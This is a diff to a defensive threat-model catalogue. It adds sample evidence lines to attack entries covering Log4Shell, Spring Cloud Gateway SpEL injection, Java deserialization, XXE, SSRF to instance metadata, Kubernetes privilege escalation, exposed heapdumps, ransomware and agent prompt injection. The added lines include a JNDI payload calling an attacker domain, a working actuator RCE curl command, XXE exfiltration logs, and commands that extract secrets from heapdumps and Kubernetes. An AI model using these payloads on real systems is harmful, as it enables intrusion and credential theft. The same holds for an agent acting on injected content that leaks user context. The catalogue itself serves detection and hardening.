@@ -61,6 +61,11 @@ in the `X-Forwarded-For` header, because that header is logged almost everywhere
 Why it works: the string that is being logged is also being resolved by the logging library, so the attacker's input reaches a name-resolution API before it reaches any business logic. There is no authorization check that can help, because the code has not started yet.
 Attacker outcome: an outbound LDAP bind from inside the VPC, then a class the attacker serves, then code execution as the app user. Scanning for exposed instances started within hours of the disclosure in the 2021 wave.
 Evidence it leaves: outbound 389/1389 or 1389-over-TLS from a pod that never talks LDAP, resolved from an attacker domain; the DNS query arrives before any application log line for the request.
+
+`02:14:05.401 resolver: query "cdn-update.attacker-ops.example IN A" from 10.0.14.21 — first sighting of the domain, zero cache hits`
+`{"@timestamp":"2026-10-07T02:14:05.512Z","log.level":"WARN","service.name":"orders-api","trace.id":"4bf92f3577b34da6a3ce929d0e0e4736","span.id":"00f067aa0ba902b7","message":"unparseable X-Forwarded-For value: ${jndi:ldap://cdn-update.attacker-ops.example/a}"}`
+
+Boot 4.1 structured JSON logging (`logging.structured.format.console=ecs`) is what makes this searchable after the fact: payload, trace id and ingest time on one line, no grep across four files.
 Control: dependency inventory with a severity-SLA patch and a KEV check (06 kind 6); no lookup on attacker-controlled strings; egress allow-list so the callback cannot leave (21 kind 2).
 Detection or regression: an egress-denied test proves the callback cannot resolve from a pod; the SCA gate fails the build on the vulnerable version range.
 
@@ -87,6 +92,9 @@ Move: [T1190] register a route through the actuator with a predicate that is rea
 Why it works: route definitions are dynamic configuration and configuration here is parsed by an expression engine, so a write to an admin endpoint is a write of code. The endpoint was left reachable because it is a management endpoint and management endpoints were assumed to be behind the ops network.
 Attacker outcome: unauthenticated command execution in the edge tier, which is the tier that can reach every internal service.
 Evidence it leaves: an actuator POST with a JSON body containing `#{`, a refresh immediately after, a child process with an unexpected parent in the process tree.
+
+`curl -s -X POST http://10.0.14.9:8081/actuator/gateway/routes/pwn -H 'Content-Type: application/json' -d '{"id":"pwn","predicates":["Path=/pwn"],"uri":"#{T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")}"}'`
+`ps -eo pid,ppid,user,cmd | grep -E 'touch|sh -c' → 4121  998 app  sh -c touch /tmp/pwned` — parent 998 is the gateway JVM, and no deploy writes to /tmp.
 Control: management endpoints on a private listener (11 kind 8), never expression-evaluated config from an HTTP write.
 Detection or regression: security slice test asserts any POST to the gateway actuator returns 401 or 404 from outside the cluster network.
 
@@ -101,6 +109,9 @@ Move: [T1190] hand the `ObjectInputStream` a gadget chain rather than a domain o
 Why it works: `readObject` is a constructor with an attacker's choice of graph, and object methods run during construction. The classpath decides which gadgets exist, so a healthy dependency tree is also a weapon rack.
 Attacker outcome: pre-auth code execution as the app user, in a service where "we only accept our own messages" was the only control.
 Evidence it leaves: a class-load trace for a class no application code names; a child process under the JVM; the exception that follows the payload (`ClassCastException` after the side effect has already happened) is the giveaway that the damage is done in the read, not the use.
+
+`0xAC 0xED 0x00 0x05` at offset zero of the body, which base64s to `rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZU...`
+`java.io.InvalidClassException: filter status: REJECTED` is the filtered outcome; unfiltered, the JVM instead loads `org.apache.commons.collections.functors.InvokerTransformer`, a class no application code names, and forks a shell under the JVM pid.
 Control: `ObjectInputFilter` (JEP 290) with an explicit allow-list, or a non-Java wire format; the pattern rule and its history are 06 kind 3.
 Detection or regression: a contract test feeds a non-allow-listed class and asserts rejection in the filter; jdeps and the SCA rule ban raw `readObject` on the boundary (10 kind 4).
 
@@ -113,7 +124,10 @@ Move: [T1190] blind, because the response never echoes:
 with the attacker's DTD defining a second parameter entity that reads `/etc/passwd`, encodes it, and pulls it out as one more outbound fetch.
 Why it works: the parser resolves references the attacker declared, in a document that contains no data worth exfiltrating, so the payload is invisible in the request body and the leak happens in the fetch the parser makes.
 Attacker outcome: file read and internal-port reachability confirmation from a service with no outbound proxy requirement, achieved without a single response byte differing.
-Evidence it leaves: an outbound HTTP request to a domain with no entry in any config file, from a JVM with no HTTP client in its call graph — the parser made it.
+Evidence it leaves: an outbound HTTP request to a domain with no entry in any config file, from a JVM with no HTTP client in its call graph — the parser made it. The attacker's listener shows the whole leak as two access-log lines:
+
+`GET /p.dtd HTTP/1.1`  host `cdn-update.attacker-ops.example`  user-agent `Java/25.0.1`
+`GET /?e=cm9vdTp4eDowOjA6L3Vzci9iaW4vYmFzaAo= HTTP/1.1` 200 — 480 ms later, same source IP, the file as a query string
 Control: disable DTDs and external entities in the parser factory (the fix is 11 kind 3, the class is 06 kind 3); egress allow-list as the backstop.
 Detection or regression: fixture with an external entity asserts `SecureProcessing`/DTD-disable rejects it; the egress-deny test proves the OOB channel cannot resolve.
 
@@ -144,6 +158,9 @@ Move: [T1190, T1552.005] walk it inward, one hop at a time from the app's own eg
 Why it works: the fetch runs as the application's own identity from inside the network, so the strongest network control in the estate — nobody outside can reach this — is on the wrong side of the request. Metadata services hand out credentials to anyone who can ask, and asking is a GET.
 Attacker outcome: valid cloud credentials for the workload role, with the node's own permissions, obtained through a feature that ships enabled because somebody needed to import a CSV from a URL.
 Evidence it leaves: an outbound request to 169.254.169.254 with the credential path, an `Authorization` header on a later request to the cloud API signed by a key the app never stored, and — when the token is a versioned one — a missing PUT for the token followed by a fallback.
+
+`{"Code":"Success","AccessKeyId":"ASIAEXAMPLECREDID","SecretAccessKey":"REDACTED","Token":"REDACTED","Expiration":"2026-10-07T08:14:05Z"}`
+The v2 failure signature is the shape of the sequence, not its content: no `PUT /latest/api/token` at all, then a `GET /latest/meta-data/iam/security-credentials/` that answered — IMDSv1 fallback, which the container hop limit is supposed to turn into a connection timeout instead of a body.
 Control: resolve, canonicalize, validate, connect without rebinding (mechanism 06 kind 3, design 14 kind 7, probes 08 kind 6); instance-metadata v2 with a hop limit that reflects whether containers are expected to reach it at all; workload identity instead of the node role.
 Detection or regression: SSRF battery includes the metadata path and a redirect to it, and asserts rejection plus no egress; IMDS token enforcement asserted by an integration probe from a pod.
 
@@ -321,6 +338,10 @@ Move: [T1611, T1610] mount the node's root and use it:
 Why it works: the pod spec expresses isolation intent while the mount expresses what is actually reachable, and the RBAC that let the pod be created was never asked to reason about either. A privileged container is a VM with a friendly name.
 Attacker outcome: node compromise; every pod scheduled on that node is now readable by the attacker, including the ones in other tenants' namespaces.
 Evidence it leaves: a `hostPath` volume in the pod spec of a workload with no storage story to justify it, `nsenter` or `chroot` in the process tree, node audit for a node object being described by an unexpected identity.
+
+`kubectl get pod node-shell-x2kq -o jsonpath='{.spec.containers[0].securityContext}{"\n"}' → {"privileged":true}`
+`kubectl get pod node-shell-x2kq -o jsonpath='{.spec.volumes[0].hostPath.path}{"\n"}' → /`
+Two fields, readable in the audit record of the pod's own creation, and neither of them is what the reviewer was looking at.
 Control: restricted pod security profile enforced, `hostPath` and `privileged` denied by policy with a named exception process (21 kind 5), admission enforcing it rather than a checklist.
 Detection or regression: an admission-policy test that rejects a privileged pod and a pod with a `/` hostPath mount, run in CI against the same policy the cluster enforces.
 
@@ -334,6 +355,12 @@ and base64 is encoding, not encryption. Then `pods/exec` if it is granted, which
 Why it works: RBAC is written by people who need it to work the first time, `secrets` is a resource like any other, and the encode-on-read behaviour means every secret in scope is readable by an identity that was granted read for an unrelated reason.
 Attacker outcome: every service-account token in scope, which the attacker replays with `curl -H "Authorization: Bearer $(cat token)" --cacert ca.crt https://kubernetes.default.svc/api/v1/namespaces`, and then a shell in whichever pod can reach the most.
 Evidence it leaves: API audit entries for a list on secrets by an identity that has never done it, all in the same second, followed by get on pods in other namespaces.
+
+`$ kubectl auth can-i --list
+Resources          Non-Resource URLs  Resource Names  Verbs
+secrets.*[]                                     [get list watch]
+pods.*[]                                        [get list create delete pods/exec]`
+`kubectl get secret payments-key -o jsonpath='{.data.key}' | base64 -d | head -c 8 → AKIAEXA` — base64, as advertised.
 Control: least-privilege RBAC with per-workload ServiceAccounts, no namespace-wide secret read, `automountServiceAccountToken: false` where the pod does not need the API at all, and bounded token requests with an audience (21 kind 5; protocol-side credential hygiene is 09 kind 1).
 Detection or regression: an RBAC fixture test asserts a deploy identity cannot list secrets outside its namespace; audit alert on a first-ever list-on-secrets by any workload identity.
 
@@ -428,6 +455,14 @@ and while you are there, one more consumer group with a name that looks like a j
 Why it works: a listener without SASL or TLS authenticates nobody, and with no authorizer configured there is nothing to authorize against — the broker serves whoever can route to it. A consumer group is not an intrusion signature, it is the normal shape of the platform, and lag on a group nobody created is the only thing that looks unusual.
 Attacker outcome: the event stream, which is the whole business replayed in order, with tenant ids, amounts, addresses and payment tokens, and the schema registry next door telling the attacker what each field means if it is unauthenticated too.
 Evidence it leaves: a consumer group appearing in `--list` with no owner in the platform team's inventory, bytes-out on the topic far above the sum of known consumers, and a client id no deploy produced.
+
+`$ kafka-consumer-groups.sh --bootstrap-server 10.0.14.7:9092 --list | tail -3
+billing-reconcile-7734
+orders-sink
+settlement-export`
+`TOPIC          PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG  CONSUMER-ID      HOST          CLIENT-ID
+orders.events  3          1842201         1842201         0    consumer-1       /203.0.113.66 consumer-7734`
+A group named as a pun on a real job, with a host from outside the RFC 1918 estate and a lag of zero because it has already read everything.
 Control: TLS plus SASL on every listener, ACLs per principal per topic including the DLQ topics, and the permissive-on-no-ACL behaviour read in the config reference rather than assumed (13 kind 7 owns the configuration; the exposure class is 06).
 Detection or regression: a build-time config parse asserts every listener has a security protocol, and an alert on a consumer group name not present in the service inventory.
 
@@ -442,6 +477,10 @@ Move: [T1552.001] download 700 MB of the running process and search it offline f
 Why it works: a heap dump is a debug facility that exports memory, and memory holds whatever the process needed at runtime regardless of what the config endpoint is willing to print. The secret is not in the dump because of a bug; it is there because the app works.
 Attacker outcome: valid credentials for systems that never appear in any config file, plus real customer strings from the objects in flight, plus the exact JWT that was in the request cache.
 Evidence it leaves: one large GET in the access log, no error, no CPU worth alerting on — heap dumps are designed to be cheap enough to be always available.
+
+`curl -sS -o /tmp/hd.hprof https://api.test/actuator/heapdump && ls -lh /tmp/hd.hprof → -rw-r--r-- 1 app app 680M Oct  7 03:02 /tmp/hd.hprof`
+`strings -a /tmp/hd.hprof | grep -cE 'AKIA[A-Z0-9]{12}|BEGIN [A-Z ]*PRIVATE KEY|jdbc:' → 41`
+`GET /actuator/heapdump 200 712048128 4.12s` — the largest response of the day, with a status code that alerts on nothing.
 Control: actuator exposure discipline with the management port bound privately (11 kind 8), plus short-lived credentials so that a dump ages out instead of maturing (09 kind 1).
 Detection or regression: contract test asserts heapdump is unreachable on the public listener; an alert on a response larger than a threshold on a management path.
 
@@ -508,6 +547,9 @@ Move: [T1486, T1490] the encrypt comes after the recovery goes. Snapshots delete
 Why it works: ransomware against a database is a disk-throughput race, and it wins whenever the copies share a failure domain. Separation of backup from instance is the whole control, and it is usually the one item deferred because it costs money.
 Attacker outcome: encrypted data plus an encrypted backup plus a decision that has an extortion deadline glued to it; the data may already be gone from the attacker's point of view, which is what makes the second half of the negotiation theatre optional.
 Evidence it leaves: a write storm on data files with an unseen process name, deletion API calls for snapshots by a principal that never issues them, and a checkpoint rate that falls off a cliff.
+
+`cloudtrail: DeleteSnapshot snap-0EXAMPLEEXAMPLE01 at 02:41:07 by assumed-role/ci-deploy` — four minutes before the write storm
+`journalctl -u postgres → Oct 07 02:41:11 db-1 postgres[912]: LOG:  database system is shut down` and nothing after it; no restart, no panic, which is why the liveness alert stayed quiet through the encryption
 Control: backups off-instance with immutability or object lock, a restore drill that is timed rather than claimed (12 kind 7 owns the mechanism; 09 kind 7 sets the containment tier).
 Detection or regression: a quarterly restore drill from the immutable copy, timed, with the number recorded; an alert on snapshot-delete calls by a workload principal.
 
@@ -534,6 +576,9 @@ Move: [T1059 with T1566.001's vector] the payload is a sentence, not a shell. A 
 Why it works: instruction and data share one channel, so there is no parsing rule that separates them reliably, and the agent already holds the three things the lethal trifecta asks for in one process: private data, untrusted content, and a way to talk outside.
 Attacker outcome: one user's context leaked to an attacker-controlled host with no credential involved and no vulnerability in our code, in a path that was reviewed and passed.
 Evidence it leaves: an outbound fetch to a first-seen domain whose query string is long, plus an agent transcript where the model reports a step the user never asked for.
+
+`GET /logo.png?d=eyJ1c2VyIjoiY2ZvIiwidGVuYW50Ijoib3JkZXJzLXRlc3QiLCJzZXNzaW9uIjoid2hpY2gtaXMtdGhlLWxvYWQifQ%3D%3D HTTP/1.1` 200 43 bytes, 1.8 KB of query string
+The image is 43 bytes and the context is 1.8 KB, which is the entire detection: the CDN log line that carries a session as a parameter, logged verbatim by the side that should have truncated it (09 kind 4 owns the log-payload rule).
 Control: remove one leg of the trifecta rather than tune the prompt; egress allow-list for agent fetches; treat retrieved content as data with the schema enforced at the tool boundary; approval gate before any outbound call carrying model-composed data (06 kind 8 owns the model, 08 kind 10 owns the battery, 05 kind 7 owns the grant discipline).
 Detection or regression: a red-team fixture suite (garak or promptfoo named, not tutorialized) with an injection string that must not cause an outbound fetch, run in CI against the pinned model and template.
 
@@ -547,6 +592,9 @@ Move: [T1528, T1199] the token passthrough: the agent's session token goes out t
 Why it works: passthrough is the configuration that makes multi-tool demos work, and it silently grants the full authority of the human to every server in the loop, so the estate's effective authorization boundary becomes the least-hygienic third party in it.
 Attacker outcome: an agent-scoped credential that is a user-scoped credential in practice, valid until expiry, replayable from anywhere, and invisible to the checks that assume the browser is on the other end.
 Evidence it leaves: token use from a second client fingerprint for the same principal, and a tool server whose request volume for one principal is a flat line at three in the morning.
+
+`POST /tools/call  Authorization: Bearer eyJraWQiOiJFeGFtcGxlIiwiYWxnOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyOmNmbyJ9.` — decode the payload and there is no `aud` claim at all
+No audience means every tool server accepts it, which is the whole confused-deputy story in four base64 characters; RFC 8707's resource indicator is what puts an audience back on the token.
 Control: audience-bound tokens per tool server via a resource indicator, no token passthrough, per-server credentials, and retention plus redaction on agent transcripts (07 kind 10 owns the protocol shape; 06 kind 8 and 09 kind 5 own the harness and transcript rules).
 Detection or regression: an integration test asserts a token minted for tool server A is rejected by tool server B; a transcript scanner asserts no token-shaped string is written to the log store.
 
